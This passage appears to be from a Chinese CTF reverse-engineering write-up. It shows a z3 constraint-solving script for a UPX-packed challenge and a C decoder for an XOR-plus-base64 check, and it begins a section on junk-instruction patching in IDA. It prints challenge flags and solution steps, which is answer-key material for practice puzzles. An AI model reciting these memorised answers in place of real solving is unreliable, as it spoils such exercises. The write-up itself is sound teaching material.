<span class="number">432</span> * x9 + <span class="number">541</span> * x8 + <span class="number">517</span> * x7 + <span class="number">379</span> * x6 + <span class="number">629</span> * x5 + <span class="number">995</span> * x4 + <span class="number">822</span> * x3 + <span class="number">916</span> * x2 + <span class="number">648</span> * x1 + <span class="number">168</span> * x0 + <span class="number">123</span> * x23 == <span class="number">1369613</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">315</span> * x22 + <span class="number">862</span> * x21 + <span class="number">616</span> * x20 + <span class="number">578</span> * x19 + <span class="number">612</span> * x18 + <span class="number">366</span> * x17 + <span class="number">834</span> * x16 + <span class="number">574</span> * x15 + <span class="number">190</span> * x14 + <span class="number">712</span> * x13 + <span class="number">350</span> * x12 + <span class="number">301</span> * x11 + <span class="number">431</span> * x10 + <span class="number">261</span> * x7 + <span class="number">980</span> * x6 + <span class="number">468</span> * x5 + <span class="number">172</span> * x4 + <span class="number">936</span> * x3 + <span class="number">781</span> * x2 + <span class="number">298</span> * x1 + <span class="number">333</span> * x0 + <span class="number">968</span> * x8 + <span class="number">513</span> * x9 + <span class="number">197</span> * x23 == <span class="number">1147341</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">729</span> * x22 + <span class="number">988</span> * x21 + <span class="number">143</span> * x20 + <span class="number">379</span> * x19 + <span class="number">275</span> * x18 + <span class="number">435</span> * x17 + <span class="number">435</span> * x16 + <span class="number">121</span> * x15 + <span class="number">238</span> * x14 + <span class="number">185</span> * x13 + <span class="number">289</span> * x12 + <span class="number">191</span> * x11 + <span class="number">398</span> * x10 + <span class="number">423</span> * x9 + <span class="number">249</span> * x8 + <span class="number">312</span> * x5 + <span class="number">992</span> * x4 + <span class="number">311</span> * x3 + <span class="number">749</span> * x2 + <span class="number">977</span> * x1 + <span class="number">413</span> * x0 + <span class="number">225</span> * x6 + <span class="number">192</span> * x7 + <span class="number">788</span> * x23 == <span class="number">928560</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">529</span> * x22 + <span class="number">307</span> * x21 + <span class="number">274</span> * x20 + <span class="number">597</span> * x19 + <span class="number">735</span> * x18 + <span class="number">167</span> * x15 + <span class="number">556</span> * x14 + <span class="number">487</span> * x13 + <span class="number">945</span> * x12 + <span class="number">950</span> * x11 + <span class="number">650</span> * x10 + <span class="number">342</span> * x9 + <span class="number">670</span> * x8 + <span class="number">727</span> * x7 + <span class="number">204</span> * x6 + <span class="number">104</span> * x5 + <span class="number">549</span> * x4 + <span class="number">416</span> * x3 + <span class="number">114</span> * x2 + <span class="number">531</span> * x1 + <span class="number">444</span> * x0 + <span class="number">848</span> * x16 + <span class="number">288</span> * x17 + <span class="number">453</span> * x23 == <span class="number">1139652</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">741</span> * x20 + <span class="number">808</span> * x19 + <span class="number">728</span> * x18 + <span class="number">507</span> * x17 + <span class="number">346</span> * x16 + <span class="number">620</span> * x15 + <span class="number">499</span> * x14 + <span class="number">211</span> * x13 + <span class="number">250</span> * x12 + <span class="number">305</span> * x11 + <span class="number">344</span> * x10 + <span class="number">577</span> * x9 + <span class="number">976</span> * x8 + <span class="number">193</span> * x7 + <span class="number">101</span> * x6 + <span class="number">664</span> * x5 + <span class="number">680</span> * x4 + <span class="number">712</span> * x3 + <span class="number">610</span> * x2 + <span class="number">348</span> * x1 + <span class="number">449</span> * x0 + <span class="number">975</span> * x21 + <span class="number">513</span> * x22 + <span class="number">491</span> * x23 == <span class="number">1162521</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">974</span> * x22 + <span class="number">861</span> * x21 + <span class="number">134</span> * x20 + <span class="number">777</span> * x19 + <span class="number">580</span> * x18 + <span class="number">351</span> * x17 + <span class="number">180</span> * x16 + <span class="number">574</span> * x15 + <span class="number">377</span> * x14 + <span class="number">271</span> * x13 + <span class="number">113</span> * x12 + <span class="number">739</span> * x11 + <span class="number">722</span> * x10 + <span class="number">811</span> * x9 + <span class="number">819</span> * x8 + <span class="number">979</span> * x7 + <span class="number">419</span> * x6 + <span class="number">737</span> * x5 + <span class="number">176</span> * x4 + <span class="number">878</span> * x3 + <span class="number">770</span> * x2 + <span class="number">613</span> * x1 + <span class="number">479</span> * x0 + <span class="number">543</span> * x23 == <span class="number">1289668</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">435</span> * x22 + <span class="number">122</span> * x21 + <span class="number">407</span> * x20 + <span class="number">969</span> * x19 + <span class="number">223</span> * x18 + <span class="number">264</span> * x17 + <span class="number">937</span> * x16 + <span class="number">474</span> * x15 + <span class="number">728</span> * x14 + <span class="number">652</span> * x13 + <span class="number">633</span> * x12 + <span class="number">873</span> * x11 + <span class="number">383</span> * x10 + <span class="number">145</span> * x9 + <span class="number">557</span> * x8 + <span class="number">731</span> * x7 + <span class="number">804</span> * x6 + <span class="number">968</span> * x5 + <span class="number">193</span> * x4 + <span class="number">492</span> * x3 + <span class="number">767</span> * x2 + <span class="number">712</span> * x1 + <span class="number">404</span> * x0 + <span class="number">410</span> * x23 == <span class="number">1279832</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">712</span> * x22 + <span class="number">271</span> * x21 + <span class="number">398</span> * x20 + <span class="number">515</span> * x19 + <span class="number">514</span> * x18 + <span class="number">555</span> * x17 + <span class="number">988</span> * x16 + <span class="number">217</span> * x15 + <span class="number">538</span> * x14 + <span class="number">475</span> * x13 + <span class="number">113</span> * x12 + <span class="number">557</span> * x11 + <span class="number">123</span> * x10 + <span class="number">656</span> * x9 + <span class="number">166</span> * x6 + <span class="number">636</span> * x5 + <span class="number">665</span> * x4 + <span class="number">122</span> * x3 + <span class="number">331</span> * x2 + <span class="number">290</span> * x1 + <span class="number">396</span> * x0 + <span class="number">732</span> * x7 + <span class="number">511</span> * x8 + <span class="number">577</span> * x23 == <span class="number">1095191</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">268</span> * x22 + <span class="number">635</span> * x21 + <span class="number">854</span> * x20 + <span class="number">602</span> * x19 + <span class="number">493</span> * x18 + <span class="number">529</span> * x17 + <span class="number">501</span> * x16 + <span class="number">254</span> * x15 + <span class="number">634</span> * x14 + <span class="number">264</span> * x13 + <span class="number">808</span> * x12 + <span class="number">316</span> * x11 + <span class="number">861</span> * x8 + <span class="number">403</span> * x7 + <span class="number">126</span> * x6 + <span class="number">969</span> * x5 + <span class="number">200</span> * x4 + <span class="number">322</span> * x3 + <span class="number">254</span> * x2 + <span class="number">861</span> * x1 + <span class="number">858</span> * x0 + <span class="number">499</span> * x9 + <span class="number">513</span> * x10 + <span class="number">291</span> * x23 == <span class="number">1159761</span>)</span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">140</span> * x22 + <span class="number">645</span> * x21 + <span class="number">109</span> * x20 + <span class="number">108</span> * x19 + <span class="number">761</span> * x18 + <span class="number">808</span> * x17 + <span class="number">391</span> * x16 + <span class="number">392</span> * x15 + <span class="number">496</span> * x14 + <span class="number">441</span> * x13 + <span class="number">125</span> * x12 + <span class="number">585</span> * x11 + <span class="number">747</span> * x10 + <span class="number">649</span> * x9 + <span class="number">585</span> * x8 + <span class="number">962</span> * x7 + <span class="number">798</span> * x6 + <span class="number">609</span> * x5 + <span class="number">560</span> * x4 + <span class="number">590</span> * x3 + <span class="number">564</span> * x2 + <span class="number">396</span> * x1 + <span class="number">598</span> * x0 + <span class="number">747</span> * x23 == <span class="number">1148424</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solver.check())</span><br><span class="line">    <span class="built_in">print</span>(solver.model())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_print</span>():</span><br><span class="line">    <span class="comment"># 调用之前要手动将solver的结果做一个处理,转换成合法的字典对象存入data中:</span></span><br><span class="line">    <span class="comment"># (仍然可以利用正则提高效率)</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;x11&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">        <span class="string">&#x27;x0&#x27;</span>: <span class="number">102</span>,</span><br><span class="line">        <span class="string">&#x27;x20&#x27;</span>: <span class="number">88</span>,</span><br><span class="line">        <span class="string">&#x27;x9&#x27;</span>: <span class="number">121</span>,</span><br><span class="line">        <span class="string">&#x27;x13&#x27;</span>: <span class="number">107</span>,</span><br><span class="line">        <span class="string">&#x27;x16&#x27;</span>: <span class="number">119</span>,</span><br><span class="line">        <span class="string">&#x27;x17&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x8&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x14&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">        <span class="string">&#x27;x2&#x27;</span>: <span class="number">97</span>,</span><br><span class="line">        <span class="string">&#x27;x22&#x27;</span>: <span class="number">125</span>,</span><br><span class="line">        <span class="string">&#x27;x10&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">        <span class="string">&#x27;x1&#x27;</span>: <span class="number">108</span>,</span><br><span class="line">        <span class="string">&#x27;x6&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">        <span class="string">&#x27;x23&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;x21&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">        <span class="string">&#x27;x18&#x27;</span>: <span class="number">85</span>,</span><br><span class="line">        <span class="string">&#x27;x3&#x27;</span>: <span class="number">103</span>,</span><br><span class="line">        <span class="string">&#x27;x12&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x15&#x27;</span>: <span class="number">111</span>,</span><br><span class="line">        <span class="string">&#x27;x19&#x27;</span>: <span class="number">80</span>,</span><br><span class="line">        <span class="string">&#x27;x4&#x27;</span>: <span class="number">123</span>,</span><br><span class="line">        <span class="string">&#x27;x5&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">        <span class="string">&#x27;x7&#x27;</span>: <span class="number">119</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 按照 x 后的数字进行排序</span></span><br><span class="line">    sorted_data = <span class="built_in">sorted</span>(data.items(), key=<span class="keyword">lambda</span> item: <span class="built_in">int</span>(item[<span class="number">0</span>][<span class="number">1</span>:]))</span><br><span class="line">    <span class="comment"># 重组数据</span></span><br><span class="line">    end_result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(value) <span class="keyword">for</span> key, value <span class="keyword">in</span> sorted_data)</span><br><span class="line">    <span class="comment"># 输出转换好的flag</span></span><br><span class="line">    <span class="built_in">print</span>(end_result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先调用该函数,把输出结果手动放入my_print()中</span></span><br><span class="line">calculate()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后运行该函数,输出flag</span></span><br><span class="line"><span class="comment"># my_print()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先注释掉my_print(),运行结果就是各个变量的解</span></span><br><span class="line"><span class="comment"># 然后注释掉calculate(),取消注释my_print(),运行结果就是flag</span></span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223212410.png" alt="image-20231016223212410" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223245074.png" alt="image-20231016223245074" style="zoom:50%;" /><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><h3 id="题目2-eazy-64x">题目2-eazy_64x</h3><p>用IDA打开,看到输入了长为20的字符串:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223719463.png" alt="image-20231016223719463" style="zoom:50%;" /><p>然后将字符串分割为3个一组的子串,并且最后一个分组是2个字符(因为总长20)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223744063.png" alt="image-20231016223744063" style="zoom:50%;" /><p>对每个子串(保存在dest中)调用encrypt()函数,进入其中,发现是一个标准的base64编码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223829530.png" alt="image-20231016223829530" style="zoom:50%;" /><p>同时发现,题目尽管进行了3个字符一组的单独base64,但是每组都是标准的base64,并且base64本身就是3个一组进行编码(因为<code>3\*8==4\*6</code>,如果不理解请去看base64编码的原理讲解).</p><p>所以我们直接将密文进行统一的一遍base64解码即可,无需多此一举把他们一组一组的进行解码.</p><p>再往下看,还有一个get_trans()函数,进去发现要对base64编码后的字符串的每一个字符和0x68进行异或:</p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20231016224428772.png" alt="image-20231016224428772" style="zoom:50%;" /><p>到此,我们才得到了密文,把他和全局变量glob去进行比较,所以最后的密文就在glob中,我们将其提取出来,反向操作即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016224525339.png" alt="image-20231016224525339" style="zoom:50%;" /><p>这里使用C语言进行解密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> glob[] = &#123;</span><br><span class="line">            <span class="number">50</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">91</span>, <span class="number">27</span>, <span class="number">16</span>, <span class="number">48</span>, <span class="number">90</span>,</span><br><span class="line">            <span class="number">31</span>, <span class="number">31</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">90</span>,</span><br><span class="line">            <span class="number">50</span>, <span class="number">60</span>, <span class="number">33</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">88</span>, <span class="number">85</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(glob) / <span class="keyword">sizeof</span>(glob[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(glob[i] ^ <span class="number">0x68</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ZmxhZ3sxX2wwdmVfcmV2ZTI1ZX0=</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016224712919.png" alt="image-20231016224712919" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *str, <span class="type">long</span> str_len)</span> &#123;</span><br><span class="line">    <span class="comment">//需要输入字节流的长度,因为中间可能有0</span></span><br><span class="line">    <span class="type">long</span> len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *res;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"><span class="comment">//定义base64编码表</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> base64_table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算经过base64编码后的字符串长度</span></span><br><span class="line">    <span class="keyword">if</span> (str_len % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">        len = str_len / <span class="number">3</span> * <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        len = (str_len / <span class="number">3</span> + <span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    res = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * len + <span class="number">1</span>);</span><br><span class="line">    res[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以3个8位字符为一组进行编码</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; j += <span class="number">3</span>, i += <span class="number">4</span>) &#123;</span><br><span class="line">        res[i] = base64_table[str[j] &gt;&gt; <span class="number">2</span>]; <span class="comment">//取出第一个字符的前6位并找出对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">1</span>] = base64_table[(str[j] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | (str[j + <span class="number">1</span>]</span><br><span class="line">                &gt;&gt; <span class="number">4</span>)]; <span class="comment">//将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">2</span>] = base64_table[(str[j + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span> | (str[j + <span class="number">2</span>]</span><br><span class="line">                &gt;&gt; <span class="number">6</span>)]; <span class="comment">//将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">3</span>] = base64_table[str[j + <span class="number">2</span>] &amp; <span class="number">0x3f</span>]; <span class="comment">//取出第三个字符的后6位并找出结果字符</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (str_len % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            res[i - <span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            res[i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            res[i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *code)</span> &#123;</span><br><span class="line"><span class="comment">//根据base64表，以字符找到对应的十进制数据</span></span><br><span class="line">    <span class="type">int</span> table[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>,</span><br><span class="line">                   <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">                   <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                   <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>,</span><br><span class="line">                   <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>,</span><br><span class="line">                   <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>,</span><br><span class="line">                   <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">long</span> len;</span><br><span class="line">    <span class="type">long</span> str_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *res;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算解码后的字符串长度</span></span><br><span class="line">    len = <span class="built_in">strlen</span>((<span class="type">char</span> *) code);</span><br><span class="line"><span class="comment">//判断编码后的字符串后是否有=</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>((<span class="type">char</span> *) code, <span class="string">&quot;==&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>((<span class="type">char</span> *) code, <span class="string">&quot;=&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    res = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * str_len + <span class="number">1</span>);</span><br><span class="line">    res[str_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以4个字符为一位进行解码</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; j += <span class="number">3</span>, i += <span class="number">4</span>) &#123;</span><br><span class="line">        res[j] = ((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i]]) &lt;&lt; <span class="number">2</span> |</span><br><span class="line">                 (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">1</span>]])</span><br><span class="line">                         &gt;&gt; <span class="number">4</span>); <span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合</span></span><br><span class="line">        res[j + <span class="number">1</span>] = (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">1</span>]]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                     (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">2</span>]])</span><br><span class="line">                             &gt;&gt; <span class="number">2</span>); <span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合</span></span><br><span class="line">        res[j + <span class="number">2</span>] = (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">2</span>]]) &lt;&lt; <span class="number">6</span>) |</span><br><span class="line">                     ((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i +</span><br><span class="line">                                                 <span class="number">3</span>]]); <span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> enc[<span class="number">100</span>] = <span class="string">&quot;ZmxhZ3sxX2wwdmVfcmV2ZTI1ZX0=&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *dec;</span><br><span class="line"></span><br><span class="line">    dec = (<span class="type">char</span> *) decode((<span class="type">unsigned</span> <span class="type">char</span> *) enc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decode result:\n%s\n&quot;</span>, dec);</span><br><span class="line"><span class="comment">// flag&#123;1_l0ve_reve25e&#125;</span></span><br><span class="line">    <span class="built_in">free</span>(dec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者用python也行,最后一步也可以用在线网站:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016225002172.png" alt="image-20231016225002172" style="zoom:50%;" /><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h3 id="题目3-call-above-call">题目3-call_above_call</h3><p>本题考点是花指令.</p><p>使用DIE查看发现是32位程序,使用针对32位的IDA打开.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016231052743.png" alt="image-20231016231052743"></p><p>发现有花指令,我们将addr1标签对应的那个脏字节(即call指令的首字节)patch掉,即改为nop指令,以让IDA正常分析:</p><img 